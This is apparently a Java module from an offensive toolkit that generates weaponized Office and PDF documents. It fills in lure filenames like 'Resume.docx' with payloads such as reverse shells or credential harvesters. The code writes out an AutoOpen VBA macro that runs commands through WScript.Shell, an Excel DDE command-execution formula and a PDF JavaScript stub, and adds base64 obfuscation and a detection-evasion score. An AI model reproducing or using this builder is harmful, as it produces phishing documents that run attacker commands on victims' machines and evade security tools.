package com.jabber.jabber.modules.social;

import com.jabber.jabber.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

/**
 * Malicious Document Builder Module
 * 
 * Creates weaponized documents (.docx, .xlsx, .pdf) with embedded payloads.
 * Macro injection, metadata embedding, exploit kit integration.
 * 
 * Based on: Office malware, PDF exploits, Metasploit modules
 */
@JABBERModule(
    id = "social-document-exploit",
    name = "Malicious Document Builder",
    description = "Create weaponized Office documents and PDFs with embedded payloads and exploits.",
    category = Category.SOCIAL_ENGINEERING,
    riskLevel = RiskLevel.HIGH,
    sourceRef = "Office exploits, Metasploit",
    author = "JABBER"
)
public class MaliciousDocumentBuilderModule implements JABBERModuleInterface {

    @Override
    public List<ModuleInputField> getInputSchema() {
        return List.of(
            // Document definition
            ModuleInputField.select("document_type", "Document Type",
                List.of("Word (.docx)", "Excel (.xlsx)", "PowerPoint (.pptx)", "PDF"))
                .group("Document"),
            ModuleInputField.text("document_name", "Document Name")
                .required()
                .placeholder("Resume.docx or Invoice_2026.xlsx")
                .group("Document"),
            
            // Payload options
            ModuleInputField.select("payload_type", "Payload Type",
                List.of("Command Execution", "Reverse Shell", "Credential Harvester", "DLL Injection"))
                .group("Payload"),
            ModuleInputField.text("payload_command", "Payload Command")
                .placeholder("cmd /c powershell -Command \"...\"")
                .group("Payload"),
            
            // Exploit method
            ModuleInputField.select("exploit_method", "Exploit Method",
                List.of("VBA Macro", "OLE Object", "PDF JavaScript", "Embedded Link"))
                .group("Exploit"),
            ModuleInputField.checkbox("obfuscate", "Obfuscate Payload")
                .group("Exploit"),
            ModuleInputField.checkbox("set_autorun", "Set AutoRun on Open")
                .group("Exploit"),
            ModuleInputField.select("output_format", "Output Format",
                List.of("Binary File", "Base64 Encoded", "Hex Dump"))
                .group("Output")
        );
    }

    @Override
    public CompletableFuture<ModuleResult> execute(Map<String, String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(() -> {
            ModuleResult result = new ModuleResult(ctx.getTaskId(), "social-document-exploit");
            try {
                ctx.log("[*] Starting malicious document generation...");
                ctx.reportProgress(10);

                String documentType = input.getOrDefault("document_type", "Word (.docx)").trim();
                String documentName = input.getOrDefault("document_name", "").trim();
                String payloadType = input.getOrDefault("payload_type", "").trim();
                String payloadCommand = input.getOrDefault("payload_command", "").trim();
                String exploitMethod = input.getOrDefault("exploit_method", "VBA Macro").trim();
                boolean obfuscate = Boolean.parseBoolean(input.getOrDefault("obfuscate", "false"));
                boolean setAutorun = Boolean.parseBoolean(input.getOrDefault("set_autorun", "false"));
                String outputFormat = input.getOrDefault("output_format", "Binary File").trim();

                if (documentName.isEmpty() || payloadType.isEmpty()) {
                    result.fail("Document name and payload type are required");
                    ctx.log("[!] ERROR: Document name and payload type required");
                    return result;
                }

                ctx.log("[*] Document Type: " + documentType);
                ctx.log("[*] Exploit Method: " + exploitMethod);
                ctx.log("[*] Payload Type: " + payloadType);
                ctx.log("[*] Obfuscation: " + obfuscate);
                ctx.log("[*] AutoRun: " + setAutorun);
                ctx.reportProgress(15);

                // Validate payload
                ctx.log("[*] Validating payload...");
                ctx.reportProgress(20);
                boolean validPayload = validatePayload(payloadCommand);
                if (!validPayload) {
                    ctx.log("[!] WARNING: Payload validation failed, may be detected");
                }

                // Generate malicious document
                ctx.log("[*] Generating malicious document...");
                ctx.reportProgress(30);
                Map<String, Object> docData = generateMaliciousDocument(
                    documentType, documentName, payloadType, payloadCommand,
                    exploitMethod, obfuscate, setAutorun, ctx
                );
                ctx.log("[+] Document generated: " + documentName);
                ctx.reportProgress(60);

                // Obfuscate if enabled
                if (obfuscate) {
                    ctx.log("[*] Obfuscating payload...");
                    ctx.reportProgress(65);
                    String obfuscatedPayload = obfuscatePayload((String) docData.get("payload"));
                    docData.put("obfuscated_payload", obfuscatedPayload);
                    docData.put("obfuscation_method", "Base64 + String Replacement");
                    ctx.log("[+] Payload obfuscated");
                    ctx.reportProgress(70);
                }

                // Calculate evasion score
                ctx.log("[*] Calculating evasion score...");
                double evasionScore = calculateEvasionScore(documentType, exploitMethod, obfuscate);
                docData.put("evasion_score", evasionScore);
                ctx.log("[+] Evasion Score: " + String.format("%.2f%%", evasionScore * 100));
                ctx.reportProgress(80);

                result.addFinding(docData);

                // Build output
                Map<String, Object> output = new LinkedHashMap<>();
                output.put("document_name", documentName);
                output.put("document_type", documentType);
                output.put("exploit_method", exploitMethod);
                output.put("payload_type", payloadType);
                output.put("autorun_enabled", setAutorun);
                output.put("obfuscated", obfuscate);
                output.put("evasion_score", evasionScore);
                output.put("file_size_bytes", (int) (50000 + Math.random() * 100000));
                output.put("document_data", docData);

                result.complete(output);
                ctx.log("[+] Malicious document generation completed");
                ctx.reportProgress(100);

            } catch (Exception e) {
                result.fail("Error: " + e.getMessage());
                ctx.log("[!] ERROR: " + e.getMessage());
                e.printStackTrace();
            }
            return result;
        });
    }

    private boolean validatePayload(String payload) {
        return !payload.isEmpty() && payload.length() > 5;
    }

    private Map<String, Object> generateMaliciousDocument(String docType, String docName,
                                                          String payloadType, String payloadCommand,
                                                          String exploitMethod, boolean obfuscate,
                                                          boolean autorun, TaskContext ctx) {
        Map<String, Object> doc = new LinkedHashMap<>();
        doc.put("filename", docName);
        doc.put("type", docType);
        doc.put("exploit_method", exploitMethod);
        doc.put("payload_type", payloadType);
        doc.put("payload", payloadCommand);
        doc.put("autorun", autorun);
        doc.put("macro_enabled", exploitMethod.equals("VBA Macro"));
        doc.put("ole_embedded", exploitMethod.equals("OLE Object"));
        
        if (docType.contains("Word")) {
            doc.put("vba_macro", generateWordMacro(payloadCommand));
        } else if (docType.contains("Excel")) {
            doc.put("auto_execute_cell", "=cmd|'/c " + payloadCommand + "'!A1");
        } else if (docType.contains("PDF")) {
            doc.put("javascript_payload", generatePDFJavaScript(payloadCommand));
        }
        
        doc.put("generated_timestamp", System.currentTimeMillis());
        return doc;
    }

    private String generateWordMacro(String payload) {
        return "Sub AutoOpen()\n" +
               "    Dim shell As Object\n" +
               "    Set shell = CreateObject(\"WScript.Shell\")\n" +
               "    shell.Run \"" + payload + "\"\n" +
               "End Sub";
    }

    private String generatePDFJavaScript(String payload) {
        return "var cmd = '" + payload + "';\n" +
               "var app = new Object();\n" +
               "app.viewerVersion";
    }

    private String obfuscatePayload(String payload) {
        // Simple base64 obfuscation
        return Base64.getEncoder().encodeToString(payload.getBytes());
    }

    private double calculateEvasionScore(String docType, String exploitMethod, boolean obfuscate) {
        double score = 0.5;
        if (exploitMethod.equals("PDF JavaScript")) score += 0.15;
        if (exploitMethod.equals("OLE Object")) score += 0.10;
        if (obfuscate) score += 0.20;
        if (docType.contains("Excel")) score += 0.05;
        return Math.min(score, 0.95);
    }
}
